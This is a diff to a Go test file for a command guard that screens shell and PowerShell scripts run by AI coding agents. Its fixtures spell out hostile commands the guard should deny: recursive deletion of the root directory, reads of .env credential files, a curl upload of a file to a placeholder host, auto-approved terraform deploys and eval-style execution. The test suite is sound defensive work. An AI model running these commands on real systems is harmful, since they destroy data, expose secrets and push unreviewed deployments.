@@ -393,6 +393,8 @@ func TestHeadlineHelpersPass(t *testing.T) {
 		"bash skills/diagnose/references/find-polluter.sh tmp/out.txt 'src/a.test.ts'",
 		"sh skills/diagnose/references/find-polluter.sh tmp/out.txt 'src/a.test.ts'",
 		"sh skills/scaffold/scripts/planning-protection.sh --parent docs/specs --gitignore .gitignore",
+		"powershell -NoProfile -ExecutionPolicy Bypass -File skills/diagnose/references/find-polluter.ps1 tmp/out.txt 'src/a.test.ts'",
+		"powershell -NoProfile -ExecutionPolicy Bypass -File skills/scaffold/scripts/planning-protection.ps1 --parent docs/specs --gitignore .gitignore",
 	}
 	predecessors := []string{
 		"", `cd "` + root + `"`, "git add -A", "git commit -m x", "git status", "mkdir -p out", "echo hi", "head -n 1 README.md",
@@ -412,6 +414,310 @@ func TestHeadlineHelpersPass(t *testing.T) {
 				}
 			})
 		}
+	}
+}
+
+type powerShellCorpusVerdicts struct {
+	shared, command, release, secrets string
+}
+
+func runPowerShellCorpus(t *testing.T, dir, tool, command string, want powerShellCorpusVerdicts) {
+	t.Helper()
+	findings := map[string]string{cg: want.command, rg: want.release, sg: want.secrets}
+	for _, id := range scriptSurfaces {
+		// Codex and Antigravity use their Bash envelope for a real shell call. The literal -Command operand
+		// selects PowerShell without adding an unqualified shell selector to that envelope.
+		wrapped := tool == "PowerShell" && (id == surface.Codex || id == surface.Antigravity)
+		calls := []hosttest.Call{{
+			Tool: tool, Input: map[string]any{"command": command}, Cwd: dir, Native: wrapped,
+		}}
+		if wrapped {
+			literal := "'" + strings.ReplaceAll(command, "'", "'\"'\"'") + "'"
+			calls = append(calls, hosttest.Call{
+				Tool: "Bash", Input: map[string]any{"command": "pwsh -NoProfile -Command " + literal}, Cwd: dir,
+			})
+		}
+		for _, call := range calls {
+			label := string(id)
+			if wrapped && call.Tool == "Bash" {
+				label += "/native"
+			}
+			payload := string(hosttest.Stdin(id, call))
+			for _, entry := range guardsAndGrouped {
+				t.Run(label+"/"+entry, func(t *testing.T) {
+					finding := want.shared
+					if owned := findings[entry]; owned != "" {
+						finding = owned
+					}
+					code, stdout, stderr := invokeWithLegalArgs(t, payload, id, entry)
+					if strings.Contains(stdout+stderr, canary) {
+						t.Errorf("guard leaked fixture text: %q %q", stdout, stderr)
+					}
+					if entry == pg && want.shared == "" {
+						if want.command == "" && want.release == "" && want.secrets == "" {
+							requireSilent(t, id, code, stdout, stderr)
+							return
+						}
+						reason := requireDeny(t, id, code, stdout, stderr)
+						for _, owned := range findings {
+							if owned != "" && !strings.Contains(reason, owned) {
+								t.Errorf("grouped reason %q lacks %q", reason, owned)
+							}
+						}
+						return
+					}
+					if finding == "" {
+						requireSilent(t, id, code, stdout, stderr)
+						return
+					}
+					requireOutcome(t, id, "deny", finding, code, stdout, stderr)
+				})
+			}
+		}
+	}
+}
+
+func TestPowerShellCorpusBodies(t *testing.T) {
+	pinScriptGuardEnv(t)
+	const destructive = "destructive_file_ops"
+	const deploy = "production-shaped deploy command"
+	const credential = "credential file read(s) blocked"
+	const transfer = "network_exfiltration"
+	rows := []struct {
+		name, body string
+		want       powerShellCorpusVerdicts
+	}{
+		{"comment help and advanced param", "<#\n.SYNOPSIS\nDescribe a report.\n.PARAMETER Name\nReport name.\n#>\n[CmdletBinding()]\nparam([string]$Name = 'summary')\nWrite-Output $Name\n", powerShellCorpusVerdicts{}},
+		{"switch and foreach", "foreach ($name in @('summary','detail')) {\n switch ($name) {\n  'summary' { Write-Output 'short' }\n  default { Write-Output $name }\n }\n}\n", powerShellCorpusVerdicts{}},
+		{"try catch finally", "try { Write-Output 'running' } catch { Write-Warning 'warning' } finally { Write-Output 'finished' }\n", powerShellCorpusVerdicts{}},
+		{"literal and interpolated here strings", "$name = 'summary'\n$a = @'\nreport\n'@\n$b = @\"\n$name\n\"@\nWrite-Output $a $b\n", powerShellCorpusVerdicts{}},
+		{"dotnet implicit and full type names", "$path = [IO.Path]::Combine('out', 'data.txt')\n$builder = [System.Text.StringBuilder]::new()\nWrite-Output $path $builder\n", powerShellCorpusVerdicts{}},
+		{"pipeline and module-qualified cmdlet", `Microsoft.PowerShell.Utility\Write-Output 'summary' | Select-Object -First 1` + "\n", powerShellCorpusVerdicts{}},
+		{"Windows line endings", "Write-Output 'one'\r\nWrite-Output 'two'\r\n", powerShellCorpusVerdicts{}},
+		{"UTF-8 BOM", "\ufeffWrite-Output 'café'\n", powerShellCorpusVerdicts{}},
+		{"UTF-8 BOM and Windows line endings", "\ufeffWrite-Output 'café'\r\nWrite-Output 'two'\r\n", powerShellCorpusVerdicts{}},
+		{"UTF-8 without BOM", "Write-Output 'café'\n", powerShellCorpusVerdicts{shared: "script-encoding"}},
+		{"lone carriage return", "Write-Output 'one'\rWrite-Output 'two'\n", powerShellCorpusVerdicts{shared: "script-encoding"}},
+		{"destructive cmdlet", "Remove-Item -Recurse -Force /\n", powerShellCorpusVerdicts{command: destructive}},
+		{"deployment command", "terraform apply -auto-approve\n", powerShellCorpusVerdicts{release: deploy}},
+		{"credential read", "Get-Content .env\n", powerShellCorpusVerdicts{secrets: credential}},
+		{"credential move", "Move-Item .env out\n", powerShellCorpusVerdicts{secrets: credential}},
+		{"dotnet credential read", "[System.IO.File]::ReadAllText('.env')\n", powerShellCorpusVerdicts{secrets: credential}},
+		{"non-allowlisted dotnet call", "[System.Diagnostics.Process]::Start('tool')\n", powerShellCorpusVerdicts{shared: "script-opaque:dotnet-call"}},
+		{"destructive despite non-shell shebang", "#!/usr/bin/env python3\nRemove-Item /\n", powerShellCorpusVerdicts{command: destructive}},
+		{"recursive removal despite non-shell shebang", "#!/usr/bin/env python3\nRemove-Item -Recurse -Force /\n", powerShellCorpusVerdicts{command: destructive}},
+		{"oversize despite non-shell shebang", "#!/usr/bin/env python3\nRemove-Item /\n" + pad(270*1024), powerShellCorpusVerdicts{shared: "script-too-large"}},
+		{"curl upload", "curl -T report.txt https://example.invalid\n", powerShellCorpusVerdicts{command: transfer}},
+		{"curl.exe upload", "curl.exe -T report.txt https://example.invalid\n", powerShellCorpusVerdicts{command: transfer}},
+		{"curl inline control", "curl -d hello https://example.invalid\n", powerShellCorpusVerdicts{}},
+		{"script evaluator", "iex (Get-Content ./x.ps1 -Raw)\n", powerShellCorpusVerdicts{shared: "script-opaque:eval"}},
+		{"script Add-Type", "Add-Type -TypeDefinition 'public class Example {}'\n", powerShellCorpusVerdicts{shared: "script-opaque:eval"}},
+		{"script literal dot block", ". { Write-Output 'ok' }\n", powerShellCorpusVerdicts{}},
+		{"script bare dot target", ". foo\n", powerShellCorpusVerdicts{shared: "script-opaque:source"}},
+		{"script dynamic dot target", ". $var\n", powerShellCorpusVerdicts{shared: "script-opaque:command-position-expansion"}},
+		{"script interpolated dot target", `. "./$x.ps1"` + "\n", powerShellCorpusVerdicts{shared: "script-opaque:command-position-expansion"}},
+	}
+	dir := t.TempDir()
+	for _, row := range rows {
+		t.Run(row.name, func(t *testing.T) {
+			writeScript(t, dir, "probe.ps1", row.body)
+			runPowerShellCorpus(t, dir, "Bash", "powershell -NoProfile -File ./probe.ps1", row.want)
+		})
+	}
+}
+
+func TestPowerShellCorpusCallForms(t *testing.T) {
+	pinScriptGuardEnv(t)
+	dir := t.TempDir()
+	for name, body := range map[string]string{
+		"evil.sh": "rm -rf /\n", "evil.ps1": "Remove-Item -Recurse -Force /\n",
+		"ok.sh": "echo ok\n", "x.sh": "echo redirected\n", "ok.ps1": "Write-Output 'ok'\n",
+		"x.ps1": "Write-Output 'piped'\n", "foo.txt": "Write-Output 'non-ps1'\n",
+		"args.ps1":    "param([string]$Name)\nWrite-Output $Name\n",
+		"args.inc":    "printf '%s' \"$1\"\n",
+		"script.dash": "echo dash\n", "script.ksh": "echo ksh\n",
+		"evil.dash": "rm -rf /\n", "evil.ksh": "rm -rf /\n",
+		"example.bat": "@echo off\r\necho batch\r\n", "example.cmd": "@echo off\r\necho batch\r\n",
+	} {
+		writeScript(t, dir, name, body)
+	}
+	const destructive = "destructive_file_ops"
+	const eval = "script-opaque:eval"
+	const dynamic = "script-opaque:command-position-expansion"
+	const source = "script-opaque:source"
+	const otherShell = "script-opaque:other-shell"
+	const batch = "script-opaque:batch-file"
+	const stdin = "script-opaque:stdin-to-shell"
+	const options = "script-form-unsupported-option"
+	const predecessor = "script-predecessor-may-write"
+	const caller = "script-caller-argument"
+	const sanitizedShellHint = "command_parse_limit - Use a command spelling without the unsupported wrapper or option"
+	type callRow struct {
+		name, tool, command string
+		want                powerShellCorpusVerdicts
+	}
+	rows := []callRow{
+		{"direct POSIX", "Bash", "./evil.sh", powerShellCorpusVerdicts{command: destructive}},
+		{"direct PowerShell", "PowerShell", "./evil.ps1", powerShellCorpusVerdicts{command: destructive}},
+		{"omitted extension", "PowerShell", `.\evil`, powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell call operator", "PowerShell", "& ./evil.ps1", powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell dot-source", "PowerShell", ". ./evil.ps1", powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell dot-source group", "PowerShell", "& { . ./evil.ps1 }", powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell dot-source chain", "PowerShell", "Write-Output 'ok'; . ./evil.ps1", powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell dot-source command string", "Bash", "pwsh -Command '. ./evil.ps1'", powerShellCorpusVerdicts{command: destructive}},
+		{"PowerShell bare dot target", "PowerShell", ". foo", powerShellCorpusVerdicts{shared: source}},
+		{"PowerShell dynamic dot target", "PowerShell", ". $var", powerShellCorpusVerdicts{shared: dynamic}},
+		{"PowerShell interpolated dot target", "PowerShell", `. "./$x.ps1"`, powerShellCorpusVerdicts{shared: dynamic}},
+		{"PowerShell literal dot block", "PowerShell", ". { Write-Output 'ok' }", powerShellCorpusVerdicts{}},
+		{"PowerShell literal call control", "PowerShell", "& './ok.ps1'", powerShellCorpusVerdicts{}},
+		{"older POSIX shell", "Bash", "dash ./script.dash", powerShellCorpusVerdicts{}},
+		{"dash script is inspected", "Bash", "dash ./evil.dash", powerShellCorpusVerdicts{command: destructive}},
+		{"KornShell", "Bash", "ksh ./script.ksh", powerShellCorpusVerdicts{}},
+		{"ksh script is inspected", "Bash", "ksh ./evil.ksh", powerShellCorpusVerdicts{command: destructive}},
+		{"zsh", "Bash", "zsh ./ok.sh", powerShellCorpusVerdicts{shared: otherShell}},
+		{"fish", "Bash", "fish ./ok.sh", powerShellCorpusVerdicts{shared: otherShell}},
+		{"csh", "Bash", "csh ./ok.sh", powerShellCorpusVerdicts{shared: otherShell}},
+		{"tcsh", "Bash", "tcsh ./ok.sh", powerShellCorpusVerdicts{shared: otherShell}},
+		{"direct batch", "Bash", "./example.bat", powerShellCorpusVerdicts{shared: batch}},
+		{"direct cmd script", "PowerShell", "./example.cmd", powerShellCorpusVerdicts{shared: batch}},
+		{"cmd batch target", "Bash", "cmd /c example.bat", powerShellCorpusVerdicts{shared: batch}},
+		{"cmd.exe batch target", "Bash", "cmd.exe /k ./example.cmd", powerShellCorpusVerdicts{shared: batch}},
+		{"slash File option", "Bash", "powershell /File ./ok.ps1", powerShellCorpusVerdicts{shared: options}},
+		{"Unicode dash File option", "Bash", "pwsh \u2013File ./ok.ps1", powerShellCorpusVerdicts{shared: options}},
+		{"non-ps1 File option", "Bash", "pwsh -File foo.txt", powerShellCorpusVerdicts{shared: "script-extension"}},
+		{"source with redirected stdin", "Bash", "source /dev/stdin < ./x.sh", powerShellCorpusVerdicts{shared: source}},
+		{"source with piped stdin", "Bash", "cat x.sh | source /dev/stdin", powerShellCorpusVerdicts{shared: source}},
+		{"source with inherited arguments", "Bash", "bash -c '. ./args.inc'", powerShellCorpusVerdicts{shared: caller}},
+		{"source with unproven binding", "Bash", "sh -c '. ./args.inc sample'", powerShellCorpusVerdicts{shared: caller}},
+		{"source with explicit Bash binding", "Bash", "bash -c '. ./args.inc sample'", powerShellCorpusVerdicts{}},
+		{"POSIX shell with redirected stdin", "Bash", "sh < x.sh", powerShellCorpusVerdicts{shared: "sh requires exactly -c or -lc and a literal command string", command: sanitizedShellHint}},
+		{"POSIX shell with piped stdin", "Bash", "cat x.sh | bash", powerShellCorpusVerdicts{shared: "bash requires exactly -c or -lc and a literal command string", command: sanitizedShellHint}},
+		{"PowerShell Command stdin", "PowerShell", "Get-Content x.ps1 | powershell -Command -", powerShellCorpusVerdicts{shared: stdin}},
+		{"PowerShell File stdin", "PowerShell", "Get-Content x.ps1 | pwsh -File -", powerShellCorpusVerdicts{shared: stdin}},
+		{"typed PowerShell evaluator", "PowerShell", "iex (Get-Content ./x.ps1 -Raw)", powerShellCorpusVerdicts{shared: eval}},
+		{"typed Invoke-Command alias", "PowerShell", "icm { Write-Output 'ok' }", powerShellCorpusVerdicts{shared: eval}},
+		{"typed Add-Type", "PowerShell", "Add-Type -TypeDefinition 'public class Example {}'", powerShellCorpusVerdicts{shared: eval}},
+		{"typed POSIX eval", "Bash", `eval "echo ok"`, powerShellCorpusVerdicts{shared: eval}},
+		{"dynamic command", "Bash", "$CMD ./x", powerShellCorpusVerdicts{shared: dynamic}},
+		{"relative PATH prefix", "Bash", "PATH=.:$PATH x.sh", powerShellCorpusVerdicts{shared: "script-env-pinned"}},
+		{"absolute PATH prefix", "Bash", `PATH="/usr/local/bin:$PATH" npm test`, powerShellCorpusVerdicts{}},
+		{"possibly writing predecessor", "Bash", "node gen.js; bash ./ok.sh", powerShellCorpusVerdicts{shared: predecessor}},
+		{"non-writing PowerShell predecessor", "PowerShell", "Get-ChildItem; ./ok.ps1", powerShellCorpusVerdicts{}},
+		{"PowerShell writer predecessor", "PowerShell", "Set-Content notes.txt ready; ./ok.ps1", powerShellCorpusVerdicts{shared: predecessor}},
+		{"unquoted caller pattern", "Bash", "powershell -File ./args.ps1 .e*", powerShellCorpusVerdicts{command: caller, secrets: caller}},
+		{"quoted caller pattern", "Bash", "powershell -File ./args.ps1 'src/**/*.test.ts'", powerShellCorpusVerdicts{}},
+	}
+	for _, loader := range []string{"source", "."} {
+		for _, form := range []struct{ name, command string }{
+			{"typed", "%s ./evil.sh"}, {"subshell", "(%s ./evil.sh)"}, {"brace group", "{ %s ./evil.sh; }"},
+			{"chain", "echo ok && %s ./evil.sh"}, {"pipeline", "echo ok | %s ./evil.sh"},
+			{"command string", "bash -c '%s ./evil.sh'"},
+		} {
+			rows = append(rows, callRow{
+				loader + " " + form.name, "Bash", strings.Replace(form.command, "%s", loader, 1),
+				powerShellCorpusVerdicts{command: destructive},
+			})
+		}
+	}
+	for _, row := range rows {
+		t.Run(row.name, func(t *testing.T) {
+			runPowerShellCorpus(t, dir, row.tool, row.command, row.want)
+		})
+	}
+}
+
+func TestPowerShellCorpusNestedScripts(t *testing.T) {
+	pinScriptGuardEnv(t)
+	dir := t.TempDir()
+	for name, body := range map[string]string{
+		"ok.sh": "echo ok\n", "ok.ps1": "Write-Output 'ok'\n",
+		"evil.sh": "rm -rf /\n", "evil.ps1": "Remove-Item -Recurse -Force /\n",
+	} {
+		writeScript(t, dir, name, body)
+	}
+	for _, row := range []struct {
+		name, file, body, command string
+		want                      powerShellCorpusVerdicts
+	}{
+		{"POSIX to PowerShell", "outer.sh", "pwsh -File ./ok.ps1\n", "bash ./outer.sh", powerShellCorpusVerdicts{}},
+		{"POSIX to dangerous PowerShell", "outer.sh", "pwsh -File ./evil.ps1\n", "bash ./outer.sh", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"PowerShell to POSIX", "outer.ps1", "bash ./ok.sh\n", "pwsh -File ./outer.ps1", powerShellCorpusVerdicts{}},
+		{"PowerShell to dangerous POSIX", "outer.ps1", "bash ./evil.sh\n", "pwsh -File ./outer.ps1", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"PowerShell script dot-sources a child", "outer.ps1", ". ./evil.ps1\n", "pwsh -File ./outer.ps1", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"POSIX script sources a child", "outer.sh", "source ./evil.sh\n", "bash ./outer.sh", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"POSIX script dot-sources a child", "outer.sh", ". ./evil.sh\n", "bash ./outer.sh", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"case variable pattern", "outer.sh", "x=ok\npat=ok\ncase \"$x\" in \"$pat\") echo ok ;; esac\n", "bash ./outer.sh", powerShellCorpusVerdicts{}},
+		{"case dot pattern alternatives", "outer.sh", "seg=.\ncase \"$seg\" in .|..) echo dot ;; esac\n", "bash ./outer.sh", powerShellCorpusVerdicts{}},
+		{"case pattern command substitution", "outer.sh", "case ok in \"$(rm -rf /)\") echo ok ;; esac\n", "bash ./outer.sh", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+		{"case arm command", "outer.sh", "case . in .|..) rm -rf / ;; esac\n", "bash ./outer.sh", powerShellCorpusVerdicts{command: "destructive_file_ops"}},
+	} {
+		t.Run(row.name, func(t *testing.T) {
+			writeScript(t, dir, row.file, row.body)
+			runPowerShellCorpus(t, dir, "Bash", row.command, row.want)
+		})
+	}
+}
+
+func TestPowerShellCorpusExecutableClassification(t *testing.T) {
+	pinScriptGuardEnv(t)
+	dir := t.TempDir()
+	if err := os.Mkdir(filepath.Join(dir, "bin"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	for name, body := range map[string]string{
+		"bin/agx": "#!/bin/sh\nexec \"$BIN\" \"$@\"\n", "quoted": "#!/usr/bin/env -S \"sh -x\"\necho ok\n",
+		"gen.py": "#!/usr/bin/env python3\nprint('fixture')\n",
+		"native": "\x7fELF\x02\x01\x01\x01", "big-native": "\x7fELF\x02\x01\x01\x01" + strings.Repeat("x", 270*1024),
+		"native.exe": "#!/bin/sh\nrm -rf /\n",
+	} {
+		writeScript(t, dir, name, body)
+	}
+	for _, row := range []struct {
+		name, dir, tool, command string
+		want                     powerShellCorpusVerdicts
+	}{
+		{"verified Agentics launcher", hosttest.Checkout(t), "Bash", "./bin/agx flow status", powerShellCorpusVerdicts{}},
+		{"spoofed Agentics launcher", dir, "Bash", "./bin/agx flow status", powerShellCorpusVerdicts{shared: "script-opaque:command-position-expansion"}},
+		{"quoted env split shebang", dir, "Bash", "./quoted", powerShellCorpusVerdicts{shared: "script-opaque:other-shell"}},
+		{"native executable header", dir, "Bash", "./native", powerShellCorpusVerdicts{}},
+		{"oversized native executable header", dir, "Bash", "./big-native", powerShellCorpusVerdicts{}},
+		{"exe path without script read", dir, "PowerShell", "& './native.exe' --version", powerShellCorpusVerdicts{}},
+		{"non-shell Python shebang", dir, "Bash", "./gen.py", powerShellCorpusVerdicts{}},
+	} {
+		t.Run(row.name, func(t *testing.T) {
+			runPowerShellCorpus(t, row.dir, row.tool, row.command, row.want)
+		})
+	}
+}
+
+func TestPowerShellCorpusSymlinkTargets(t *testing.T) {
+	pinScriptGuardEnv(t)
+	dir := t.TempDir()
+	bin := filepath.Join(dir, "node_modules", ".bin")
+	if err := os.MkdirAll(bin, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	for _, row := range []struct {
+		name, target, body, tool, call string
+		want                           powerShellCorpusVerdicts
+	}{
+		{"node tool", "tool.js", "#!/usr/bin/env node\nconsole.log('fixture')\n", "Bash", "./node_modules/.bin/probe", powerShellCorpusVerdicts{}},
+		{"POSIX script", "tool.sh", "#!/bin/sh\necho fixture\n", "Bash", "./node_modules/.bin/probe", powerShellCorpusVerdicts{shared: "script-unreadable"}},
+		{"PowerShell script", "tool.ps1", "#!/usr/bin/env pwsh\nWrite-Output 'fixture'\n", "PowerShell", "& ./node_modules/.bin/probe.ps1", powerShellCorpusVerdicts{shared: "script-unreadable"}},
+	} {
+		t.Run(row.name, func(t *testing.T) {
+			writeScript(t, dir, row.target, row.body)
+			link := filepath.Join(bin, filepath.Base(row.call))
+			if err := os.Symlink(filepath.Join(dir, row.target), link); err != nil {
+				t.Skipf("cannot create a file symlink on %s: %v", runtime.GOOS, err)
+			}
+			t.Cleanup(func() {
+				if err := os.Remove(link); err != nil {
+					t.Error(err)
+				}
+			})
+			runPowerShellCorpus(t, dir, row.tool, row.call, row.want)
+		})
 	}
 }
 
@@ -478,8 +784,8 @@ func (c countingScripts) ReadScript(path string) shellwords.ScriptRead {
 	return c.inner.ReadScript(path)
 }
 
-// readsFor runs one guard entry with a counting reader wrapped around the production snapshot and returns the count.
-func readsFor(t *testing.T, surface surface.ID, dir, command, entry string) int64 {
+// checkScriptReads checks the outcome with a counting reader wrapped around the production snapshot.
+func checkScriptReads(t *testing.T, dir, command, entry, decision, finding string, count int64) {
 	t.Helper()
 	deps := productionHookDependencies()
 	lookup := deps.lookup
@@ -496,26 +802,34 @@ func readsFor(t *testing.T, surface surface.ID, dir, command, entry string) int6
 			return handler(req)
 		}, true
 	}
-	invokeWithLegalArgsAndDependencies(t, deps, scriptStdin(surface, dir, command), surface, entry)
-	return reads.Load()
+	const provider = "claude-code"
+	code, out, diag := invokeWithLegalArgsAndDependencies(t, deps, scriptStdin(provider, dir, command), provider, entry)
+	requireOutcome(t, provider, decision, finding, code, out, diag)
+	if n := reads.Load(); n != count {
+		t.Errorf("%s %q read %d scripts, want %d", entry, command, n, count)
+	}
 }
 
-// A direct invocation, an interpreter other than a shell, and bash -c are never opened: no guard asks the reader for
-// a file. The shell-script call is the control that proves the counter is wired into the same path.
-func TestDirectInvocationIsNeverRead(t *testing.T) {
+func TestDirectScriptInvocationIsReadAndJudged(t *testing.T) {
 	pinScriptGuardEnv(t)
 	dir := t.TempDir()
-	writeScript(t, dir, "x.sh", "echo ok\n")
+	writeScript(t, dir, "x.sh", "echo hello\nrm -rf /\n")
+	command := cdTo(dir) + "./x.sh"
+	const finding = "1 blocking threat(s) detected: destructive_file_ops"
+	checkScriptReads(t, dir, command, cg, "deny", finding, 1)
+	checkScriptReads(t, dir, command, rg, "pass", "", 1)
+	checkScriptReads(t, dir, command, sg, "pass", "", 1)
+	checkScriptReads(t, dir, command, pg, "deny", finding, 3)
+}
+
+func TestNonFileScriptCallsDoNotReadScripts(t *testing.T) {
+	pinScriptGuardEnv(t)
+	dir := t.TempDir()
 	writeScript(t, dir, "x.py", "print('ok')\n")
 	cd := cdTo(dir)
 	for _, entry := range guardsAndGrouped {
-		for _, command := range []string{cd + "./x.sh", cd + "python x.py", cd + "bash -c 'echo x'"} {
-			if n := readsFor(t, "claude-code", dir, command, entry); n != 0 {
-				t.Errorf("%s %q read %d scripts", entry, command, n)
-			}
-		}
-		if n := readsFor(t, "claude-code", dir, cd+"bash ./x.sh", entry); n == 0 {
-			t.Errorf("%s: control call read nothing, so the counter is not wired", entry)
+		for _, command := range []string{cd + "python x.py", cd + "bash -c 'echo x'"} {
+			checkScriptReads(t, dir, command, entry, "pass", "", 0)
 		}
 	}
 }
